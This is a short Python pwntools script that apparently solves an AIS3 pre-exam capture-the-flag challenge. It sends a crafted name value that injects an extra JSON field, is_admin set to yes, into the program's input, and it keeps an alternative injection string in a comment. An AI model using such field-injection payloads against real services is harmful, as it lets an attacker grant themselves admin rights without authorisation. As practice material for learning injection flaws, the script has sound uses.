# coding=utf-8
from pwn import *

r = remote('pre-exam-chals.ais3.org', 10203)
r = process('./main.rb')

r.recvuntil('Your name:')
r.sendline('aa\",\"is_admin\":\"yes')
#r.sendline('aa\"}\"\n\n res[\'is_admin\']="yes"')
r.recvuntil('Your age:')
r.sendline('1')

print r.recvall(1)